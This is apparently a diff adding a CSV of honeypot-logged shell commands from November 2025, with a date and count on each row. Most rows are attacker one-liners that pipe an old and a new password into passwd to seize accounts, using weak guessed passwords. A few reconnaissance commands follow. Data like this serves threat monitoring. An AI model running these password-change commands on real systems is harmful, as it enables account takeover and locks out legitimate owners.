+"echo -e ""internal\nFIdKec8F7mNG\nFIdKec8F7mNG""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""internal\nvG2eAFl9zvwi\nvG2eAFl9zvwi""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""ir123\n3LR46r2Ytd1C\n3LR46r2Ytd1C""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""ir123\n8mXRXGwvCpaw\n8mXRXGwvCpaw""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""ir123\nWse4TeisVCsL\nWse4TeisVCsL""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""ir123\ngt3ulf7MWZG4\ngt3ulf7MWZG4""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""jack\n5HBUwurVEFol\n5HBUwurVEFol""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""jason\n0K2ng1jbGq3g\n0K2ng1jbGq3g""|passwd|bash",17/11/2025 00:00,1
+"echo -e ""jason\nJglHvgD8HVyR\nJglHvgD8HVyR""|passwd|bash",17/11/2025 00:00,1
+"echo -e ""jay123\nE8CJAsBcNsvS\nE8CJAsBcNsvS""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""jay123\nyufOPhxujMRN\nyufOPhxujMRN""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""jenkins\n99QjBUuhCYTb\n99QjBUuhCYTb""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""jenkins\nAIChx9PH31B1\nAIChx9PH31B1""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""jeremy\nRHwbTrbzvmrh\nRHwbTrbzvmrh""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""jeremy\nlPigvHmkzQMh\nlPigvHmkzQMh""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""jmarquez\n2CIrUumchmhh\n2CIrUumchmhh""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""jmarquez\n2Vi3RCs6cLwB\n2Vi3RCs6cLwB""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""jmarquez\n2pBefkRTlXdw\n2pBefkRTlXdw""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""jmarquez\nQErH2EKuSk8r\nQErH2EKuSk8r""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""jmarquez\ncuins86dJ2xU\ncuins86dJ2xU""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""jmarquez\ne0doEoQ2wCff\ne0doEoQ2wCff""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""john@123\nuSXAhFy9B0eg\nuSXAhFy9B0eg""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""jrodrig\nkBc6bxGz0N2U\nkBc6bxGz0N2U""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""kafka123\nBCA6p84kfysS\nBCA6p84kfysS""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""kafka123\nXMC2Au3xT2H3\nXMC2Au3xT2H3""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""kali@123\nDMub3Qy0MG06\nDMub3Qy0MG06""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""karthik123\nysLodIrqEX30\nysLodIrqEX30""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""lam\nCIp8hmIKqQIU\nCIp8hmIKqQIU""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""lam\nPitEQo2bwcv9\nPitEQo2bwcv9""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""lana\nXVOKShcBpf14\nXVOKShcBpf14""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""localhost\nZqIfiY2qvF5a\nZqIfiY2qvF5a""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""localhost\nt5heJI6NFhAH\nt5heJI6NFhAH""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""lol\nbRprsITmByLO\nbRprsITmByLO""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""magento@123\nli5hdTYVceDd\nli5hdTYVceDd""|passwd|bash",28/11/2025 00:00,1
+"echo -e ""mainuser\ndJ6KU5s1wWNB\ndJ6KU5s1wWNB""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""mainuser\nleYW890j8yU1\nleYW890j8yU1""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""mana\nKLyVXAw6MFA1\nKLyVXAw6MFA1""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""mana\nLWU3sNXAAij5\nLWU3sNXAAij5""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""mana\nat3bytVYnXZs\nat3bytVYnXZs""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""martin123\nXkydJDhweg3O\nXkydJDhweg3O""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""max@123\n9sQGjwvkvHIT\n9sQGjwvkvHIT""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""max@123\nzaWItxLKe4Gb\nzaWItxLKe4Gb""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""mcserver@123\nEJdMF3QilDo5\nEJdMF3QilDo5""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""mcserver@123\nvR5OqcVgkcGM\nvR5OqcVgkcGM""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""mirco\nPJlnKjk8zScM\nPJlnKjk8zScM""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""mithun\nDFOH2DRJ73WI\nDFOH2DRJ73WI""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""monika123\nhEhkCK1xnw8h\nhEhkCK1xnw8h""|passwd|bash",17/11/2025 00:00,1
+"echo -e ""mostafa1\nuv4NEeBzjiP5\nuv4NEeBzjiP5""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""mqm@123\nBGmHkEz5Cb4g\nBGmHkEz5Cb4g""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""mqm@123\ncb0MT7mTIKkM\ncb0MT7mTIKkM""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""mysql@1234\nA1pXYtSvrP4j\nA1pXYtSvrP4j""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""mysql@1234\nEuWtYWfpmUzx\nEuWtYWfpmUzx""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""newpassword\ntC7nePLju7PX\ntC7nePLju7PX""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""newuser123\ncB7D6wXZsZ72\ncB7D6wXZsZ72""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""nguyen\nYXa6dMEDr1rB\nYXa6dMEDr1rB""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""nguyen\nh8wTvqHeGpLf\nh8wTvqHeGpLf""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""nguyen\nzedWtgTC2GVz\nzedWtgTC2GVz""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""nishant123\njvHpktqbYIKb\njvHpktqbYIKb""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""nishant123\nweTNxkvZrwpA\nweTNxkvZrwpA""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""nodered\n8C4yy87xxxDk\n8C4yy87xxxDk""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""o2\nADTfie8nt1v4\nADTfie8nt1v4""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""o2\nLrVziApA6wFE\nLrVziApA6wFE""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""o2\nP3FB1oWmEGaL\nP3FB1oWmEGaL""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""o2\nuEeVnIllhW8r\nuEeVnIllhW8r""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""o2\nuk0IdTjl7zcQ\nuk0IdTjl7zcQ""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ob\nMs0ZmFrmTaz6\nMs0ZmFrmTaz6""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""odoo123\ntfGk7P10EWFx\ntfGk7P10EWFx""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""odoo15@123\n6sgLUX0NYSDn\n6sgLUX0NYSDn""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""openbravo@123\n1hZ4pQos2UX4\n1hZ4pQos2UX4""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""openbravo@123\nOob485iauUkO\nOob485iauUkO""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""openbravo@123\nZwiBFQ73TXQI\nZwiBFQ73TXQI""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""oracle#2026\nMhVbiXC2GQPO\nMhVbiXC2GQPO""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""oracle#2026\nnojIIhCR36V5\nnojIIhCR36V5""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""oracle01\nLg1v7KNjnIzj\nLg1v7KNjnIzj""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""oracle01\naQr7PLElG8Sv\naQr7PLElG8Sv""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""otrs\nNT2nOIod1Upa\nNT2nOIod1Upa""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""otrs\nbtS854lJ2zOP\nbtS854lJ2zOP""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\n1TtIb0Q12bPC\n1TtIb0Q12bPC""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\n2Z3KRliCF2P2\n2Z3KRliCF2P2""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\n6rCqdatOrGEn\n6rCqdatOrGEn""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\n7hMEzhhFoDkm\n7hMEzhhFoDkm""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\nELkxLkXAzwEY\nELkxLkXAzwEY""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\nGNlBmuQEhZ8N\nGNlBmuQEhZ8N""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\nITqXTozyPXDV\nITqXTozyPXDV""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\nWh1agkpLjT2S\nWh1agkpLjT2S""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\nYJojw9QQnRUt\nYJojw9QQnRUt""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\ncNDTqpopEElR\ncNDTqpopEElR""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\ndFHWm9pXK4DG\ndFHWm9pXK4DG""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\neeWg4FOvS2zl\neeWg4FOvS2zl""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""p\noFfd568bTYvT\noFfd568bTYvT""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\npXyjc78y4t3S\npXyjc78y4t3S""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\ntQF6qdfaiVl5\ntQF6qdfaiVl5""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\nu1FiqgYwAirw\nu1FiqgYwAirw""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\nw116M8oNGHyX\nw116M8oNGHyX""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""p\nzGyZWXKWi0GM\nzGyZWXKWi0GM""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""password\nAt5I5o7KI6mx\nAt5I5o7KI6mx""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""password\nDDDxLbvafIEx\nDDDxLbvafIEx""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""password\nDSMVNz8ME6KN\nDSMVNz8ME6KN""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""password\naiSH9FBbMm7D\naiSH9FBbMm7D""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""password\nfrDHmPMcoKX1\nfrDHmPMcoKX1""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""password\nmxQO1cHoDd40\nmxQO1cHoDd40""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""password\nt7EG85A3v9em\nt7EG85A3v9em""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""password\nzmTbZtfRHUNc\nzmTbZtfRHUNc""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""plunga471\nE8dQ9Mv8HmQz\nE8dQ9Mv8HmQz""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""plunga471\nhD5FbhJm0c7A\nhD5FbhJm0c7A""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""plunga471\npQig5vUizKxV\npQig5vUizKxV""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""plunga471\ntSZj7n7z3jsQ\ntSZj7n7z3jsQ""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""plunga471\nzaUQbIYBoML3\nzaUQbIYBoML3""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""pooja\nMHdEoAqWe2bD\nMHdEoAqWe2bD""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""posiflex123\n9ctNVkzrYcQT\n9ctNVkzrYcQT""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""profe\nAHXuVmTJqDK5\nAHXuVmTJqDK5""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""profe\nqhwqaBmg9tlv\nqhwqaBmg9tlv""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""proxyuser@123\nFQKHfG05LJGG\nFQKHfG05LJGG""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""proxyuser@123\nacEpe3aRkQjI\nacEpe3aRkQjI""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""proxyuser@123\ndBFjFg6WpIHW\ndBFjFg6WpIHW""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""qiyuesuo@123\neX4gEIGlUp5z\neX4gEIGlUp5z""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""qiyuesuo@123\nu3RxcW0vf7jO\nu3RxcW0vf7jO""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""qq123456\ngsV0cFaU4fKN\ngsV0cFaU4fKN""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""qwe123!@#\nNhFHVyaLLZpB\nNhFHVyaLLZpB""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""qwe123!@#\nRmjM7oDhoSIz\nRmjM7oDhoSIz""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""qwe123!@#\nzQf4hOlvepmJ\nzQf4hOlvepmJ""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""qwer1234\nCHskuQHlCjWC\nCHskuQHlCjWC""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""qwer1234\nuWoAnvIVggqh\nuWoAnvIVggqh""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""qwer1234\nwHQUzvPFqk9n\nwHQUzvPFqk9n""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""qwerty123456\nBI1E8jNdLAER\nBI1E8jNdLAER""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""qwerty123\nJRQhf43w1dd9\nJRQhf43w1dd9""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""qwerty123\nVbkS0BQqIzXw\nVbkS0BQqIzXw""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""qwerty123\nlp7aC8amL7r5\nlp7aC8amL7r5""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""qwerty123\nmI2vEFd0jAle\nmI2vEFd0jAle""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""radio@123\nY693BpK4daD3\nY693BpK4daD3""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""radio@123\nyFetvP5skI44\nyFetvP5skI44""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""rafael123\nrnZkcG88NCwy\nrnZkcG88NCwy""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""redis123\nZiTpxMFZg8Ke\nZiTpxMFZg8Ke""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""redis\nO95TtRpSOBqZ\nO95TtRpSOBqZ""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""redis\nqz20Qiuy7gLC\nqz20Qiuy7gLC""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""redmine\nAr4mZD22S5me\nAr4mZD22S5me""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""root\nZmOm1U0MeElm\nZmOm1U0MeElm""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""root\njA894LNtdTws\njA894LNtdTws""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""root\nxu90SxsO9vKz\nxu90SxsO9vKz""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""s\nTovbP7myuEo1\nTovbP7myuEo1""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""saas@123\nwcp8lYuFYWpv\nwcp8lYuFYWpv""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""sales1@123\ng1F6zA21sW8X\ng1F6zA21sW8X""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""sam123\nzDB0rRq9kv5D\nzDB0rRq9kv5D""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""sftp1\nZc4zBc4qhFit\nZc4zBc4qhFit""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""sftp1\nav2UMQ5tIKbq\nav2UMQ5tIKbq""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""sftpuser2025\n7mXwFAo964Rf\n7mXwFAo964Rf""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""sftpuser2025\nJlhuGeytXTqs\nJlhuGeytXTqs""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""sftpuser2025\nR3rjWH3SDvW1\nR3rjWH3SDvW1""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""sftpuser2025\ndKOtJ7ZN1iNG\ndKOtJ7ZN1iNG""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""smbuser1\niOTw3K5r8Stt\niOTw3K5r8Stt""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""sr123\nFjLNqci0rUgQ\nFjLNqci0rUgQ""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""sr123\nrTvIfVgPyxtx\nrTvIfVgPyxtx""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""sr123\ntMayagxsnIeu\ntMayagxsnIeu""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""sshuser@2026\nzKNcA8HKfcZ5\nzKNcA8HKfcZ5""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""steam@123\n5OHnWQEdc2xc\n5OHnWQEdc2xc""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""steam@123\n8Ln7Zm9v8Hgx\n8Ln7Zm9v8Hgx""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""steam@123\nFxdvbBl9Wuml\nFxdvbBl9Wuml""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""steam@123\nXirsDm8d0mMW\nXirsDm8d0mMW""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""steam@123\nm8mli9o9Ef8R\nm8mli9o9Ef8R""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""steam@123\npta30nQkEXJQ\npta30nQkEXJQ""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""studio\nNwMTsoaUwhZC\nNwMTsoaUwhZC""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""support\nLY02S3NfkOEJ\nLY02S3NfkOEJ""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""taufik123\nN3Sx0KRco4RW\nN3Sx0KRco4RW""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""tempuser@123\n1vw8LXxwcWiI\n1vw8LXxwcWiI""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""terraria@123\nWyO4ThDvYcUv\nWyO4ThDvYcUv""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""test123\nEUgTQ6BMpKpK\nEUgTQ6BMpKpK""|passwd|bash",17/11/2025 00:00,1
+"echo -e ""test\nncSHnzBkTijn\nncSHnzBkTijn""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""testt\n30WySZRq2jcM\n30WySZRq2jcM""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""testt\n38xOGLY4isQu\n38xOGLY4isQu""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""testtest\nV291NZHh91nF\nV291NZHh91nF""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""tg1234\nhCTnl189Kvmq\nhCTnl189Kvmq""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""tibero123\n1XhdcYjNg62k\n1XhdcYjNg62k""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""tibero123\nuZEjeeoHUNq2\nuZEjeeoHUNq2""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""tibero\nBzWJKDteat70\nBzWJKDteat70""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""tibero\nKkhTyAT1zIZl\nKkhTyAT1zIZl""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""toto\nNPYa4Q4GdZaB\nNPYa4Q4GdZaB""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""toto\naOBMPs7P5PJc\naOBMPs7P5PJc""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""toto\nuIoZ8X2xpQMw\nuIoZ8X2xpQMw""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""trevor\n7jf7skRdzOBK\n7jf7skRdzOBK""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""trevor\n7yAmRV4FOysi\n7yAmRV4FOysi""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""trevor\ntkx0ToNa2NK6\ntkx0ToNa2NK6""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""uat\nz8PO4wfSBc1z\nz8PO4wfSBc1z""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""uftp\nlgxSMm4Jx0Op\nlgxSMm4Jx0Op""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""user123!\n4InLkJJXNqif\n4InLkJJXNqif""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""user123\nBQfPNOYsf0a0\nBQfPNOYsf0a0""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""user@123\nOx3whMNvrRM7\nOx3whMNvrRM7""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""user@123\ncBbnG5YYjAJ9\ncBbnG5YYjAJ9""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""userb123\nQQaHMu6zXeKj\nQQaHMu6zXeKj""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""username123\nTbCiRriKxnjD\nTbCiRriKxnjD""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""username123\nnLmOFFUXhSFK\nnLmOFFUXhSFK""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""username123\nwKnSECDK32Gc\nwKnSECDK32Gc""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""username\nWWXB0PfZzLc4\nWWXB0PfZzLc4""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""username\na43xcWbxG63o\na43xcWbxG63o""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""username\nkwDrtvg4dnTa\nkwDrtvg4dnTa""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""usuario1123\nkDpGbHCW0jVg\nkDpGbHCW0jVg""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""vagrant\nuHgpDwfsLAxX\nuHgpDwfsLAxX""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""veera123\nCkdS3t53kKG5\nCkdS3t53kKG5""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""vikas@123\n2tbi04GegY2E\n2tbi04GegY2E""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""vikas@123\nPqmBkQGRcGtG\nPqmBkQGRcGtG""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""vikas@123\nrs4dA3YzM2G6\nrs4dA3YzM2G6""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""vod\nPLZY6AmzHanA\nPLZY6AmzHanA""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""vpn123\n7ziZ4rWqFhPl\n7ziZ4rWqFhPl""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""vpn123\ngZCQASAF8ejt\ngZCQASAF8ejt""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""vpn\nIOa6hbiLDLky\nIOa6hbiLDLky""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""vps@123\nRHenhu1l8XJc\nRHenhu1l8XJc""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""vps@123\naSPm97cBmar3\naSPm97cBmar3""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""vps\niPFs80LV9Ind\niPFs80LV9Ind""|passwd|bash",30/11/2025 12:00,1
+"echo -e ""welcome1\nFbRMN7HWn3hE\nFbRMN7HWn3hE""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome1\nR2VZUDbM60sF\nR2VZUDbM60sF""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome1\nawHREVtaDxL1\nawHREVtaDxL1""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome1\np0LEnoziHy7t\np0LEnoziHy7t""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome1\nsFovSSdRoxH5\nsFovSSdRoxH5""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome1\nujO9MnILaEVs\nujO9MnILaEVs""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""welcome\nDT18qVEuhtQb\nDT18qVEuhtQb""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""william\nLZHRwg4Wgmkm\nLZHRwg4Wgmkm""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""windows\nQbbZJH40Zxc8\nQbbZJH40Zxc8""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""wqadmin\nXrNjbCERqUma\nXrNjbCERqUma""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""wqadmin\nwddcb3tzjcgO\nwddcb3tzjcgO""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""yuli123\naMVWlOOl69Lb\naMVWlOOl69Lb""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""yuli123\ngTP6gOG8KnuM\ngTP6gOG8KnuM""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""z4ng0rber\nk8bLOSFtohcz\nk8bLOSFtohcz""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""zhangbin\n3vPczafnOphN\n3vPczafnOphN""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""zhangbin\nYY9N4SoqGckr\nYY9N4SoqGckr""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""zhangbin\nryM6CO7qAuM4\nryM6CO7qAuM4""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""zhangbin\nsSIrGmb18XGd\nsSIrGmb18XGd""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""zhangbin\nyaP9kFbJpflF\nyaP9kFbJpflF""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""zhaoyu\nLM3736T7G8l5\nLM3736T7G8l5""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""zimbra123\n8NI5EApsjqUE\n8NI5EApsjqUE""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""zimbra123\nrixgF3FHH1y8\nrixgF3FHH1y8""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""zsolt\n0UR0BD1Bp1HD\n0UR0BD1Bp1HD""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""zsolt\nFPvCmbMCKp2f\nFPvCmbMCKp2f""|passwd|bash",15/11/2025 12:00,1
+echo login_success,25/11/2025 00:00,1
+ls -la /,22/11/2025 12:00,1
+netstat -tulpn | head -10,22/11/2025 00:00,1
+ps aux | head -10,17/11/2025 00:00,1
+ssh -V,19/11/2025 00:00,1
+uname -m 2>/dev/null || echo unknown,30/11/2025 00:00,1
+w; uname -a;,17/11/2025 12:00,1
